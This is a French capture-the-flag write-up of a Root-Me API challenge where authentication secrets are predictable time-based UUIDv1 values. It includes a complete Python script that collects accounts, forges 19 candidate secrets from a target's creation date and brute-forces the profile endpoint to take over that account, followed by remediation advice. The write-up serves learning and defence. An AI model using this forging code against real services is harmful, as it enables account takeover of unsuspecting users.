# Write-up — Root-Me API : secret UUIDv1 prédictible

**Challenge :** `challenge01.root-me.org:59091`
**Catégorie :** API / Web
**Faille :** utilisation d'un UUID **version 1** (basé sur le temps) comme secret d'authentification.

---

## 1. Résumé

L'API délivre à chaque utilisateur un `secret` sous forme d'UUID. Ce secret sert
d'authentifiant sur `/api/profile?secret=...`. L'erreur de conception : le secret
est un **UUIDv1**, c'est-à-dire un *timestamp déguisé*, et non une valeur aléatoire
(UUIDv4).

En collectant quelques comptes, on observe que sur les 128 bits de l'UUID :

- le champ **node** (`0242ac100016`, une MAC Docker) est **constant** ;
- le champ **clock_seq** (`34d8`) est **constant** ;
- seul le champ **temps** varie — et il est **égal à la `creation_date`** renvoyée par l'API.

Conclusion : **`secret = f(creation_date)`**. Si l'on connaît la date de création
d'une cible, on reforge son secret et on accède à son profil.

---

## 2. Anatomie d'un UUIDv1

```
3109d260-c193-11f1-b4d8-0242ac100016
└──────┬──────┘ │     │    └─────┬─────┘
    temps      ver  clock_seq   node (MAC)
```

- **node** : identité machine (historiquement l'adresse MAC).
- **clock_seq** : compteur anti-collision tiré au démarrage.
- **temps** : instant de génération, sur 60 bits, en **intervalles de 100 ns** depuis
  l'epoch `1582-10-15`.

Le `1` dans `...-11f1-...` indique la **version 1**. C'est le signal d'alerte :
contrairement à un UUIDv4, il n'y a quasiment pas d'entropie.

---

## 3. La corrélation observée

Extrait de collecte :

```
[+] jean30  secret=3109d260-c193-11f1-b4d8-0242ac100016 creation=2026-10-06 14:35:35.227658 node=0242ac100016 clock_seq=34d8
[+] jean31  secret=31f77a30-c193-11f1-b4d8-0242ac100016 creation=2026-10-06 14:35:36.785157 node=0242ac100016 clock_seq=34d8
...
=== Synthèse ===
node(s) observés   : {'0242ac100016'}
clock_seq observés : {'34d8'}
>> node ET clock_seq constants : secret = f(temps) -> forgeable depuis une creation_date connue.
```

Sur chaque ligne, le temps **décodé depuis le secret** est strictement égal à la
`creation_date` renvoyée par l'API. Il ne reste aucune inconnue :

```
creation_date connue
      │  (datetime -> champ temps 60 bits)
      ▼
+ node figé + clock_seq figé
      ▼
UUIDv1 reconstruit = le secret
```

---

## 4. Le piège de la sous-microseconde

L'UUID encode le temps en pas de **100 ns**, mais `creation_date` n'a qu'une
précision **microseconde**. On a donc :

```
u.time = µs × 10 + r      avec r ∈ 0..9   (le "reste 100 ns")
```

Quand `r ≠ 0`, le dernier chiffre de 100 ns est **perdu** dans `creation_date`.
Impossible de reforger le secret exact à partir de la seule date → il faut tester
plusieurs candidats.

**Règle de conversion utile :**

| Écart datetime | Écart `u.time` | Effet sur l'UUID |
|----------------|----------------|-------------------|
| 100 ns | 1 | dernier chiffre hex de `time_low` |
| 1 µs | 10 | derniers chiffres de `time_low` |
| 1 ms | 10 000 | `time_low` |
| 1 s | 10 000 000 | `time_low` déborde sur `time_mid` |

De plus, le serveur **arrondit** (ou tronque) le dernier chiffre : le bon candidat
peut être au-dessus **ou** en dessous de la valeur µs. On balaie donc `-9..+9`
ticks, soit **19 essais maximum** — trivial.

> **Exemple réel.** Pour `creation_date = 2026-10-06 02:09:11.003420`, le bon secret
> était `eb8f831c-...` (`+4`), car le vrai `u.time` finissait par un reste de `4`,
> invisible dans la date tronquée à la µs.

---

## 5. Exploitation (pas à pas)

1. **Créer un compte à soi** et récupérer `node` + `clock_seq` (constants serveur).
2. **Obtenir la `creation_date` de la cible** (exposée publiquement selon le contexte).
3. **Forger** les 19 secrets candidats autour de cette date.
4. **Tester** chaque candidat sur `/api/profile?secret=...` → le premier `200` est le bon.

---

## 6. Code complet

```python
#!/usr/bin/env python3
"""
Root-Me — corrélation creation_date <-> secret (UUIDv1).

Pipeline par utilisateur :
  1) POST /api/signup   (username/password = <prefix><index>)
  2) POST /api/login    -> récupère "secret" + cookie "session"
  3) GET  /api/profile?secret=<secret> (avec le cookie) -> récupère "creation_date"

Le secret est un UUIDv1 : node et clock_seq sont figés côté serveur, donc le
secret est entièrement déterminé par le temps (= creation_date). On le prouve
par des assertions, puis on peut forger le secret de n'importe quelle cible
dont la date de création est connue.
"""

import sys
import time
import uuid
import datetime as dt

import requests

BASE = "http://challenge01.root-me.org:59091"

HEADERS = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
    "Accept": "application/json",
    "Content-Type": "application/json",
    "Origin": BASE,
    "Referer": BASE + "/",
}

# Epoch des UUIDv1 : 1582-10-15, en datetime NAÏF (même convention que creation_date).
UUID_EPOCH = dt.datetime(1582, 10, 15)


# ---------------------------------------------------------------------------
# Conversions temps <-> UUIDv1  (arithmétique ENTIÈRE, aucune perte)
# ---------------------------------------------------------------------------

def uuid1_to_datetime(secret: str) -> dt.datetime:
    """Instant encodé dans l'UUIDv1 -> datetime naïf (précision µs)."""
    u = uuid.UUID(secret)
    micros, _rem_100ns = divmod(u.time, 10)   # u.time en ticks de 100 ns -> µs
    return UUID_EPOCH + dt.timedelta(microseconds=micros)


def datetime_to_uuid1_time(when: dt.datetime) -> int:
    """datetime naïf -> champ 'time' 60 bits (ticks de 100 ns)."""
    delta = when - UUID_EPOCH
    micros = (delta.days * 86400 + delta.seconds) * 1_000_000 + delta.microseconds
    return micros * 10


def _build_uuid1(timestamp: int, node: int, clock_seq: int) -> uuid.UUID:
    """Assemble un UUIDv1 champ par champ (pas d'API publique pour ça)."""
    time_low = timestamp & 0xFFFFFFFF
    time_mid = (timestamp >> 32) & 0xFFFF
    time_hi_version = (timestamp >> 48) & 0x0FFF
    time_hi_version |= 1 << 12                 # version 1
    clock_seq_low = clock_seq & 0xFF
    clock_seq_hi_variant = (clock_seq >> 8) & 0x3F
    clock_seq_hi_variant |= 0x80               # variante RFC 4122
    return uuid.UUID(fields=(time_low, time_mid, time_hi_version,
                             clock_seq_hi_variant, clock_seq_low, node))


def forge_secret(when: dt.datetime, node: int, clock_seq: int) -> uuid.UUID:
    """Reforge un UUIDv1 depuis une date + node/clock_seq (constants côté serveur)."""
    return _build_uuid1(datetime_to_uuid1_time(when), node, clock_seq)


def forge_candidates(when: dt.datetime, node: int, clock_seq: int):
    """Depuis une date µs (potentiellement ARRONDIE/TRONQUÉE par le serveur),
    génère les secrets 100 ns candidats. On balaie -9..+9 ticks pour couvrir
    arrondi ET troncature : au pire 19 essais contre /api/profile."""
    base = datetime_to_uuid1_time(when)   # multiple de 10
    return [_build_uuid1(base + k, node, clock_seq) for k in range(-9, 10)]


# ---------------------------------------------------------------------------
# Assertions : on PROUVE que le secret est reconstructible
# ---------------------------------------------------------------------------

def assert_secret_reconstructible(secret: str) -> int:
    """
    [1] round-trip ENTIER sur le champ temps -> valide le réassemblage des champs.
    [2] forge depuis le DATETIME (µs) -> valide le chemin réel de l'attaque.
    Retourne le reste sous-µs (0..9) perdu par la conversion en datetime.
    """
    u = uuid.UUID(secret)
    node, clock_seq = u.node, u.clock_seq

    # [1] exact et inconditionnel
    rebuilt_int = _build_uuid1(u.time, node, clock_seq)
    assert rebuilt_int == u, f"[1] réassemblage cassé : {rebuilt_int} != {u}"

    # [2] forge via le datetime (= via creation_date)
    when       = uuid1_to_datetime(secret)
    t_from_dt  = datetime_to_uuid1_time(when)
    rebuilt_dt = _build_uuid1(t_from_dt, node, clock_seq)

    sub_us = u.time % 10
    if sub_us == 0:
        assert rebuilt_dt == u, f"[2] forge depuis date cassée : {rebuilt_dt} != {u}"
    else:
        assert abs(u.time - t_from_dt) < 10, f"[2] écart > 1 µs : {u.time} vs {t_from_dt}"

    return sub_us


# ---------------------------------------------------------------------------
# Requêtes HTTP
# ---------------------------------------------------------------------------

def signup(s: requests.Session, username: str, password: str):
    return s.post(f"{BASE}/api/signup", headers=HEADERS,
                  json={"username": username, "password": password}, timeout=15)


def login(s: requests.Session, username: str, password: str):
    r = s.post(f"{BASE}/api/login", headers=HEADERS,
               json={"username": username, "password": password}, timeout=15)
    r.raise_for_status()
    data = r.json()
    return data.get("secret"), s.cookies.get("session"), data


def profile(s: requests.Session, secret: str):
    r = s.get(f"{BASE}/api/profile", headers=HEADERS,
              params={"secret": secret}, timeout=15)
    r.raise_for_status()
    return r.json()


# ---------------------------------------------------------------------------
# Collecte
# ---------------------------------------------------------------------------

def run(n: int, start_index: int = 0, prefix: str = "jean"):
    rows = []
    for i in range(start_index, start_index + n):
        creds = f"{prefix}{i}"
        s = requests.Session()  # session (cookie) isolée par compte

        r = signup(s, creds, creds)
        if r.status_code not in (200, 201):
            print(f"[!] signup {creds}: {r.status_code} {r.text[:120]}")
            continue

        secret, cookie, _ = login(s, creds, creds)
        prof = profile(s, secret)
        creation = prof.get("creation_date")

        u = uuid.UUID(secret)
        node, clock_seq = u.node, u.clock_seq

        # --- Assertions : le secret est reconstructible ---
        sub_us = assert_secret_reconstructible(secret)

        # L'instant décodé du secret == creation_date renvoyée par l'API (= la faille).
        # Tolérance 1 µs : l'UUID code en 100 ns, creation_date en µs -> arrondi vs
        # troncature peuvent différer du dernier chiffre quand sub_us != 0.
        if creation:
            api_dt = dt.datetime.strptime(creation, "%Y-%m-%d %H:%M:%S.%f")
            delta = abs((uuid1_to_datetime(secret) - api_dt).total_seconds())
            assert delta <= 1e-6, (
                f"désaccord secret/creation_date > 1µs : "
                f"{uuid1_to_datetime(secret)} vs {api_dt}")

        rows.append({
            "user": creds, "userid": prof.get("userid"), "secret": secret,
            "creation_date": creation, "uuid_time": str(uuid1_to_datetime(secret)),
            "node": f"{node:012x}", "clock_seq": f"{clock_seq:04x}", "sub_us": sub_us,
        })

        print(f"[+] {creds:8} id={prof.get('userid')} secret={secret} "
              f"creation={creation} node={node:012x} clock_seq={clock_seq:04x} "
              f"sub_us={sub_us}  [OK]")
        time.sleep(0.2)  # on reste poli avec le serveur

    return rows


def summarize(rows):
    if not rows:
        print("\n(aucune donnée collectée)")
        return
    nodes = {r["node"] for r in rows}
    seqs = {r["clock_seq"] for r in rows}
    print("\n=== Synthèse ===")
    print(f"node(s) observés   : {nodes}")
    print(f"clock_seq observés : {seqs}")
    if len(nodes) == 1 and len(seqs) == 1:
        print(">> node ET clock_seq constants : secret = f(temps) -> forgeable "
              "depuis une creation_date connue.")
        if any(r["sub_us"] for r in rows):
            print(">> certains comptes ont sub_us != 0 : forge à ~19 candidats "
                  "(dernier chiffre de 100 ns).")
        else:
            print(">> tous sub_us == 0 : forge EXACTE depuis la seule creation_date.")


# ---------------------------------------------------------------------------
# Exploitation : tester les candidats contre /api/profile
# ---------------------------------------------------------------------------

def solve_target(s: requests.Session, when: dt.datetime, node: int, clock_seq: int):
    """Teste les 19 candidats 100 ns contre /api/profile, retourne (secret, json)."""
    for k, cand in enumerate(forge_candidates(when, node, clock_seq), start=-9):
        secret = str(cand)
        r = s.get(f"{BASE}/api/profile", headers=HEADERS,
                  params={"secret": secret}, timeout=15)
        if r.status_code == 200:
            print(f"[+] trouvé à k={k:+d} : {secret}")
            return secret, r.json()
    print("[!] aucun candidat valide — vérifier le fuseau de la date cible")
    return None, None


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

if __name__ == "__main__":
    count = int(sys.argv[1]) if len(sys.argv) > 1 else 5
    start = int(sys.argv[2]) if len(sys.argv) > 2 else 0

    data = run(count, start)
    summarize(data)

    # --- Forge sur une cible : reprendre node/clock_seq constants déjà collectés ---
    if data:
        node = int(data[0]["node"], 16)
        clock_seq = int(data[0]["clock_seq"], 16)

        # /!\ Même convention de fuseau que les creation_date observées (naïf).
        cible = dt.datetime(2026, 10, 6, 2, 9, 11, 3420)  # à adapter
        print(f"\n[forge] date={cible} -> secret µs pile = {forge_secret(cible, node, clock_seq)}")
        print("[forge] 19 candidats (reste 100 ns) :")
        for k, c in enumerate(forge_candidates(cible, node, clock_seq), start=-9):
            print(f"        {k:+d}  {c}")

        # Pour résoudre directement :
        # s = requests.Session()
        # solve_target(s, cible, node, clock_seq)
```

---

## 7. Exemple de forge validé

Date cible : `2026-10-06 02:09:11.003420`

```
secret µs pile : eb8f8318-c12a-11f1-b4d8-0242ac100016
...
+4  eb8f831c-c12a-11f1-b4d8-0242ac100016   <-- BON SECRET
...
```

Le bon secret était le candidat `+4` — seul le dernier chiffre hex de `time_low`
change entre les candidats, tout le reste de l'UUID est figé.

---

## 8. Remédiation

- Utiliser un **UUIDv4** (CSPRNG) ou `secrets.token_urlsafe()` pour tout secret.
- Ne jamais dériver un identifiant secret d'une valeur **observable** (date de création,
  ID séquentiel, timestamp).
- Séparer **identifiant** (public, ex. `userid`) et **secret d'authentification**
  (aléatoire, non corrélé à des métadonnées).

---

## 9. À retenir

> Un UUID n'est « imprévisible » que s'il est de **version 4**. Un **UUIDv1** est un
> timestamp + MAC + compteur : dès que node et clock_seq sont stables, il se réduit à
> une fonction du temps, donc entièrement **forgeable**.
